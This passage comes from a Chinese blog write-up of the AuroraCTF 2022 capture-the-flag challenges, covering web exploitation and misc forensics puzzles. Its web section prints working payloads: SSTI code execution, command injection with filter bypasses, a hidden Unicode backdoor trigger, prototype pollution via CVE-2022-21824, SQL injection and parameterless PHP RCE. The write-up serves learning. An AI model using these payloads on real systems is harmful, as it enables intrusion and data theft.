class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;    </span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">bin boot dev etc fl3g.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr <span class="keyword">var</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//大致意思就是需要通过任意方式传入cmd，并且是以json形式，就是&#123;&quot;&quot;:&quot;&quot;&#125;形式</span></span><br><span class="line">    <span class="comment">//如果匹配到上面的字符就寄是吧</span></span><br><span class="line">    <span class="comment">//但是preg_match能够使用%0a绕过（</span></span><br><span class="line">    <span class="comment">//所以直接使用&#123;%0a&quot;cmd&quot;:&quot;/bin/ls /&quot;%0a&#125;查目录，发现fl3g.txt</span></span><br><span class="line">    <span class="comment">//直接cat读取即可 AURORA&#123;0h_n1c3!&#125;</span></span><br></pre></td></tr></table></figure><h3><span id="revengessti"> revengessti</span></h3><p>ssti模板注入，过滤了单引号、下划线</p><p>使用ctfshow366的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(abc|<span class="title function_ invoke__">attr</span>(request.cookies.a)|<span class="title function_ invoke__">attr</span>(request.cookies.b)|<span class="title function_ invoke__">attr</span>(request.cookies.c))(request.cookies.d).<span class="keyword">eval</span>(request.cookies.e)&#125;&#125;</span><br><span class="line">a=__init__;b=__globals__;c=__getitem__;d=__builtins__;e=<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;os&#x27;</span>).<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;cat flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__class__&quot;</span>)相当于</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__</span><br></pre></td></tr></table></figure><p>这里是使用cookie传参</p><p><strong>flag=Aurora{Request_reQuest_@ll_requesT!!}</strong></p><p>关于ssti，本萌新其实真的不懂qwq</p><h3><span id="letmeguess"> letmeguess</span></h3><p>每日一题的靶场做过一次了，所以比较简单</p><p>提示是登录的密码是弱密码，所以可以直接用字典爆（</p><p>爆出来的结果就是admin123</p><p>然后就可以使用ping了，ping后面可以夹带其他命令，比如ls、cat啥的</p><p>这里如果直接使用|ls的话会显示非法语句，说明存在过滤</p><p>应该是preg_match型（同样使用%0a绕过</p><p>发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; index.php</span><br><span class="line">    [1] =&gt; kylin</span><br><span class="line">    [2] =&gt; login.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这个kylin应该就藏有flag</p><p>输入cat login.php/index.php发现被过滤</p><p>这里的过滤应该是cat / 空格 /两者都有</p><p>所以干脆直接全换了：空格换成%09、cat换成nl/echo/tac</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">35</span>] =&gt;     <span class="number">36</span><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    [<span class="number">36</span>] =&gt;     <span class="number">37</span>    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    [<span class="number">37</span>] =&gt;     <span class="number">38</span>    <span class="variable">$m</span> = [];</span><br><span class="line">    [<span class="number">38</span>] =&gt;     <span class="number">39</span>    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|touch|more|curl|scp|kylin|echo|tmp|var|run|find|grep|-|`|&#x27;|:|&lt;|&gt;|less|more)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">    [<span class="number">39</span>] =&gt;     <span class="number">40</span>        <span class="comment">//$cmd = &quot;&#123;$ip&#125;&quot;;</span></span><br><span class="line">    [<span class="number">40</span>] =&gt;     <span class="number">41</span><span class="variable">$cmd</span> = <span class="string">&quot;ping <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">    [<span class="number">41</span>] =&gt;     <span class="number">42</span><span class="comment">//$cmd = &quot;ping -c 4&quot;.$_GET[&#x27;ip&#x27;];</span></span><br><span class="line">    [<span class="number">42</span>] =&gt;     <span class="number">43</span>        <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    [<span class="number">43</span>] =&gt;     <span class="number">44</span>    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    [<span class="number">44</span>] =&gt;     <span class="number">45</span>        <span class="variable">$res</span> = <span class="string">&#x27;Hacker,存在非法语句&#x27;</span>;</span><br><span class="line">    [<span class="number">45</span>] =&gt;     <span class="number">46</span>    &#125;</span><br><span class="line">    [<span class="number">46</span>] =&gt;     <span class="number">47</span>&#125;</span><br><span class="line"><span class="comment">//发现过滤词，过滤了kylin和flag</span></span><br><span class="line"><span class="comment">//可以使用k*、f*进行匹配</span></span><br><span class="line"><span class="comment">//同时flag应该就在kylin 里面</span></span><br><span class="line"><span class="comment">//我们进入kylin文件夹查看即可</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?ip=%<span class="number">0</span>acd%<span class="number">09</span>k*%<span class="number">0</span>als<span class="comment">#</span></span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; flag</span><br><span class="line">)</span><br><span class="line">直接读取</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=%<span class="number">0</span>acd%<span class="number">09</span>k*%<span class="number">0</span>anl%<span class="number">09</span>f*<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;thAi_is_always_th3re_fOr_y0u&#125;</span><br></pre></td></tr></table></figure><h3><span id="tha1nodeshell"> Tha1nodeshell</span></h3><p>额，这个是不可见字符成的后门，可以通过visual studio code 看见</p><p>可以通过这个字符传递参数，执行命令</p><p>打开F12</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Why Not Try /xman--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Why Not Try /read --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--flag is in env --&gt;</span></span><br></pre></td></tr></table></figure><p>提示/read 和flag在环境变量内</p><p>这里的post file其实是使用post方法传递一个file</p><p>不是上传文件…</p><p>由于是nodejs，所以可以访问app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//thai在这里留了个shell，你能发现吗</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/network_health&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; timeout,ㅤ&#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">&#x27;ping -c 1 baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;curl -s https://viewofthai.link/&#x27;</span>,ㅤ</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(checkCommands.<span class="title function_">map</span>(<span class="function"><span class="params">cmd</span> =&gt;</span> </span><br><span class="line">                cmd &amp;&amp; <span class="title function_">exec</span>(cmd, &#123; <span class="attr">timeout</span>: +timeout || <span class="number">5_000</span> &#125;)));</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其实这里也能看得到的，逗号后面空了一个</p><p>这里漏掉的字符可以进入checkcommands 执行命令</p><p>所以可以使用这个字符执行命令，并且写入一个文件中，再读取即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">network_health?%E3%<span class="number">85</span>%A4=env&gt;<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p>大概如此，然后读取1.txt即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=Aurora&#123;405a103c-81a1-4956-97f7-0716204d3292&#125;</span><br></pre></td></tr></table></figure><h3><span id="another_vn_node"> another_vn_node</span></h3><p>啊这个是取巧做的（</p><p>使用CVE-2022-21824进行攻击（</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">k</span> =&gt;</span> <span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[k]);</span><br><span class="line">    <span class="comment">//res.send(&quot;flag&#123;1212&#125;&quot;);</span></span><br><span class="line">    res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">FLAG</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//最重要的就是这一段了，向proto传递参数即可</span></span><br><span class="line"><span class="comment">//而CVE-2022-21824发现可以向proto传递参数</span></span><br><span class="line"><span class="comment">//console.table([&#123;a:1&#125;],[&#x27;__proto__&#x27;])</span></span><br><span class="line"><span class="comment">//就是这个</span></span><br></pre></td></tr></table></figure><p>submit之后直接查看/flag</p><p><strong>Aurora{78929acd-3456-4483-b043-c9c5fa1a5a59}</strong></p><h3><span id="babysql"> babysql</span></h3><p>喜提-52分，看了提示才知道是无列名注入 omo</p><p>提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/1=&#x27;1</span><br></pre></td></tr></table></figure><p>使用mysql.innodb_table_stats时，不储存列名，这也是为什么叫无列名注入</p><p>使用提示爆出库名、表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/1=&#x27;1</span><br><span class="line">return : ctf,ctftraining,mysql</span><br><span class="line">0&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/1=&#x27;1</span><br><span class="line">return : ccctttfff,flag,news,users,gtid_slave_pos</span><br></pre></td></tr></table></figure><p>很明显flag表内的内容就是我们需要的内容，接下来我们要读取它的列</p><p>无列名注入的大概意思就是 给表里面的列取个名，然后读取它</p><p>根据提示的命令得知过滤了空格，回显位置为3</p><p>自己测试发现过滤了#、–+ 所以这里使用了单引号闭合</p><p>不要问我怎么测出来的，一个劲的搞时间盲注，我是铸币</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">无列名注入需要我们判断表内有多少列</span><br><span class="line">0&#x27;/**/union/**/select/**/1,2,(select/**/group_concat(1)/**/from/**/database.table)&#x27;</span><br><span class="line">判断列数，有多少个1就是几列</span><br><span class="line">database是数据库名</span><br><span class="line">table是表名</span><br><span class="line">0&#x27;/**/union/**/select/**/1,2,(select/**/group_concat(1)/**/from/**/ctftraining.flag)&#x27;</span><br><span class="line">回显 1</span><br><span class="line">说明只有一列</span><br></pre></td></tr></table></figure><img src="/2022/12/03/AuroraCTF-Write-Up/qwq.png" class title="回显"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">然后取名读取即可</span><br><span class="line">0&#x27;/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from/**/(select/**/1/**/as/**/b/**/union/**/select/**/*/**/from/**/ctftraining.flag)a)&#x27;</span><br><span class="line">/*选择ctftraining.flag内的第一列取名为b并且读取b*/</span><br><span class="line">回显：</span><br><span class="line">Here is your want!</span><br><span class="line">1,flag&#123;3ad644264147148fe51c1f5096fff153&#125;</span><br></pre></td></tr></table></figure><h3><span id="hard_rce"> hard_rce</span></h3><p>hhh，写过的demo里面提到过确实很难，搞不懂，现在再看应该还是这样的</p><p>学习一下即可，die码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z_]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|if|localeconv|phpversion|implode|apache|sqrt|et|na|nt|strlen|info|path|rand|die|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>,<span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;What are you thinking?&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;can you? xi dog!&#x27;</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出过滤了很多函数、同时这个preg_replace处限制了我们只能够使用无参数rce（函数嵌套括号）</p><p>这就让我想起了之前做的一个题的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))));</span><br></pre></td></tr></table></figure><p>然后一看，var_dump、array、pos、localeconv全被过滤了，寄</p><p>但是万幸没有过滤show_source和scandir</p><p>可以通过scandir(‘.’)返回的内容使用show_source()显示出来，然后flag应该是在最末尾（这里比较幸运的就是撞对了），可以使用end()读取，所以关键就是构造出那个点（pos(localeconv())就是返回这个点）</p><p>而仔细看没有过滤chr</p><p>而点又是chr(46)，所以这里只需要构造出46就好了</p><p>接下来就是借鉴dalao写的wp里面的内容了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">uniqid</span>() --&gt; 返回一个随机字符串，是以时间为基础的，所以前几位字符一般不会变化</span><br><span class="line"><span class="title function_ invoke__">floor</span>()  --&gt; 将字符串转化为数字</span><br><span class="line"><span class="title function_ invoke__">strrev</span>()  --&gt; 将字符串倒序输出，在这里就可以将变化的字符移到前面，使得floor转化的数字有变化</span><br><span class="line"><span class="title function_ invoke__">end</span>()  --&gt; 返回数组的最后一个元素，配合<span class="title function_ invoke__">show_source</span>()使用</span><br><span class="line">所以我们可以根据这些函数构造出一个随机的数，通过chr转化为 点 然后输出flag</span><br><span class="line">payload:</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">uniqid</span>()))))));</span><br><span class="line">由于生成的数是随机的，所以要多随机几次</span><br><span class="line">额，具体是几次呢...</span><br><span class="line">看运气的</span><br></pre></td></tr></table></figure><p>使用burp的intruder模块进行爆破就好了</p><img src="/2022/12/03/AuroraCTF-Write-Up/AttackPosition.png" class title="intruder爆破"><img src="/2022/12/03/AuroraCTF-Write-Up/Result.png" class title="结果"><p>flag: Aurora{you_are_so_great}</p><h2><span id="misc"> Misc</span></h2><h3><span id="xnheulpb"> xnheulpb</span></h3><p>百度一下题面xnheulpb 发现其名为小鹤双拼</p><img src="/2022/12/03/AuroraCTF-Write-Up/xnheulpb.png" class title="打字方案"><p>根据打字的方法打出这几个字即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">tk--&gt;听</span><br><span class="line">uo--&gt;说</span><br><span class="line">所以</span><br><span class="line">没：mw</span><br><span class="line">有：yz</span><br><span class="line">内：nw</span><br><span class="line">马：ma</span><br><span class="line">尔：er</span><br><span class="line">的：de</span><br><span class="line">巴：ba</span><br><span class="line">西：xi</span><br><span class="line">队：dv</span><br><span class="line">才：cd</span><br><span class="line">是：ui</span><br><span class="line">真：vf</span><br><span class="line">正：vg</span><br><span class="line">mwyznwmaerdebaxidvcduivfvgdebaxidv</span><br><span class="line">flag&#123;mwyznwmaerdebaxidvcduivfvgdebaxidv&#125;</span><br></pre></td></tr></table></figure><h3><span id="绝密信息"> 绝密信息</span></h3><p>提示是有标记，所以拖进stegsolve查看</p><img src="/2022/12/03/AuroraCTF-Write-Up/solve.png" class title="结果"><h3><span id="check-in"> Check in</span></h3><p>找出这段文字不和谐的地方即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Welcome everyone to participate in the 2022 AuroraCTF freshman competition</span><br><span class="line"></span><br><span class="line">Competition URL: https://actf.szu.moe</span><br><span class="line"></span><br><span class="line">Competition time: 9:30, November 26, 2022 ~ 21:30, December 2, 2022</span><br><span class="line"></span><br><span class="line">Registration email: Please use the student email email.szu.edu.cn to regiswer</span><br><span class="line"></span><br><span class="line">Competition reles: Adopt the CTF comletition system, divided inco five or five direcoions (old five), after the competitiom, you need to submit a writeup as the besis for scoring</span><br><span class="line"></span><br><span class="line">Scoring rules: On!y three directions for each person will be included in the total score (the three directions with the highest score), total score = main direction * 70 + first sub-direction * 50 + second sub-direction * 30. Each player should submit the writeup in pdf format to the designated link (announced after the game) within 24 hours after the game. All players are requested to complete the competition independently, and it is strictly forbidden to exchange flags with other players.</span><br><span class="line"></span><br><span class="line">Flag Format: flag&#123;xxx&#125; or Aurora&#123;xxx&#125;</span><br></pre></td></tr></table></figure><p><s>题外话:想起自己怎么做这个题的时候就笑死了</s></p><p><s>day 1: 欸为什么这么长一段英文啊，然后仔细看看，On!y是什么鬼</s></p><p><s>然后想起星期五的英文</s></p><p><s>我明白了，然后去对照哪里有不同（其实拖进word就知道了</s></p><p><s>然后我就很傻的一直用原来的英文输入flag</s></p><p><s>day 2：躺床上继续想，欸，是不是提交改了之后的英文？</s></p><p><s>立刻爬起来 一看  所有错误的英文单词能够组成welcome!</s></p><p><s>那没事了</s></p><h3><span id="ping"> PING</span></h3><p>打开Wireshark查看ping的内容即可</p><p>会发现每次ping的最后总会返回一个字符</p><p>而露出破绽的地方就在{，是flag的格式（</p><p>所以打开查看每一个ping的数据就能找到flag了</p><p>图片太多了qwq，懒得保存了</p><img src="/2022/12/03/AuroraCTF-Write-Up/ping1.png" class title="ping1"><img src="/2022/12/03/AuroraCTF-Write-Up/ping2.png" class title="ping2"><img src="/2022/12/03/AuroraCTF-Write-Up/ping3.png" class title="ping3"><img src="/2022/12/03/AuroraCTF-Write-Up/ping4.png" class title="ping4"><img src="/2022/12/03/AuroraCTF-Write-Up/ping5.png" class title="ping5"><img src="/2022/12/03/AuroraCTF-Write-Up/ping6.png" class title="ping6"><img src="/2022/12/03/AuroraCTF-Write-Up/ping7.png" class title="ping7"><img src="/2022/12/03/AuroraCTF-Write-Up/ping8.png" class title="ping8"><img src="/2022/12/03/AuroraCTF-Write-Up/ping9.png" class title="ping9"><img src="/2022/12/03/AuroraCTF-Write-Up/ping10.png" class title="ping10"><img src="/2022/12/03/AuroraCTF-Write-Up/ping11.png" class title="ping11"><img src="/2022/12/03/AuroraCTF-Write-Up/ping12.png" class title="ping12"><img src="/2022/12/03/AuroraCTF-Write-Up/ping13.png" class title="ping13"><img src="/2022/12/03/AuroraCTF-Write-Up/ping14.png" class title="ping14"><img src="/2022/12/03/AuroraCTF-Write-Up/ping15.png" class title="ping15"><img src="/2022/12/03/AuroraCTF-Write-Up/ping16.png" class title="ping16"><img src="/2022/12/03/AuroraCTF-Write-Up/ping17.png" class title="ping17"><img src="/2022/12/03/AuroraCTF-Write-Up/ping18.png" class title="ping18"><img src="/2022/12/03/AuroraCTF-Write-Up/ping19.png" class title="ping19"><img src="/2022/12/03/AuroraCTF-Write-Up/ping20.png" class title="ping20"><img src="/2022/12/03/AuroraCTF-Write-Up/ping21.png" class title="ping21"><p>组合一下就是</p><p><strong>Aurora{Wh4t_1s_PING?}</strong></p><h3><span id="location"> Location</span></h3><p>推荐使用</p><p>exif在线查看一把梭</p><p><a href="https://exif.tuchong.com/">EXIF信息查看器</a></p><p>然后配合</p><p><a href="http://www.gzhatu.com/du2dfm.html">经纬度格式转换工具软件</a>使用</p><img src="/2022/12/03/AuroraCTF-Write-Up/location.png" class title="location"><img src="/2022/12/03/AuroraCTF-Write-Up/location2.png" class title="location"><img src="/2022/12/03/AuroraCTF-Write-Up/location23.png" class title="location"><h3><span id="strongman"> StrongMan</span></h3><p>Hint: Faster; <strong>Higher</strong>; Stronger. Come and see him in all his glory.</p><p>Higher处加粗、附件是三张图片，应该是提示修改图片高度</p><p>使用010Editor修改即可</p><img src="/2022/12/03/AuroraCTF-Write-Up/StrongMan1.png" class title="StrongMan"><img src="/2022/12/03/AuroraCTF-Write-Up/StrongMan2.png" class title="StrongMan"><img src="/2022/12/03/AuroraCTF-Write-Up/StrongMan3.png" class title="StrongMan"><p>修改宽高后即可看到flag：</p><p><s>（第一张图是Aurora{W）</s></p><img src="/2022/12/03/AuroraCTF-Write-Up/Back.jpg" class title="StrongMan"><img src="/2022/12/03/AuroraCTF-Write-Up/Legs.bmp" class title="StrongMan"><h3><span id="webshell"> WebShell</span></h3><p>既然是webshell，那么hacker肯定需要通过eval函数post一些东西执行命令</p><p>然后会回显结果</p><p>所以我们直接查查执行的命令以及回显的结果</p><p>也就是 http contains c</p><img src="/2022/12/03/AuroraCTF-Write-Up/WebShell.png" class title="WebShell"><p>发现回显的内容是一串base64，解码即可</p><img src="/2022/12/03/AuroraCTF-Write-Up/base64dec.png" class title="WebShell"><h3><span id="barcode"> Barcode</span></h3><p>条形码解密，附件是缺失定位码的QRCode、Maxicode、dotcode、pdf417</p><p>直接修补定位码、然后全部丢进去<a href="https://demo.dynamsoft.com/barcode-reader/">Dynamsoft Barcode Reader</a></p><p>这个也是能直接读取pdf的（</p><img src="/2022/12/03/AuroraCTF-Write-Up/MaxiResult.png" class title="Barcode"><img src="/2022/12/03/AuroraCTF-Write-Up/PDFResult.png" class title="Barcode"><img src="/2022/12/03/AuroraCTF-Write-Up/dotResult.png" class title="Barcode"><img src="/2022/12/03/AuroraCTF-Write-Up/QRCodeResult.png" class title="Barcode"><p>结束~</p><h3><span id="webshell-2"> WebShell 2</span></h3><p>同样是webshell，所以搜索http contains c</p><img src="/2022/12/03/AuroraCTF-Write-Up/WebShell2-1.png" class title="WebShell2"><p>发现hacker是通过上传webshell进行攻击的，同时发现了一个zip文件，使用wireshark可以进行导出</p><img src="/2022/12/03/AuroraCTF-Write-Up/WebShell2-2.png" class title="WebShell2"><p>保存为1.zip，打开发现需要密码</p><img src="/2022/12/03/AuroraCTF-Write-Up/WebShell2-3.png" class title="WebShell2"><p>所以我们还需要在流量内找压缩包的密码</p><p>由于hacker是上传的webshell到服务器内，所以我们需要关注他post的内容是啥</p><img src="/2022/12/03/AuroraCTF-Write-Up/WebShell2-4.png" class title="WebShell2"><p>这是很明显的蚁剑流量特征（详见看看蚁剑流量包）</p><img src="/2022/12/03/AuroraCTF-Write-Up/WebShell2-5.png" class 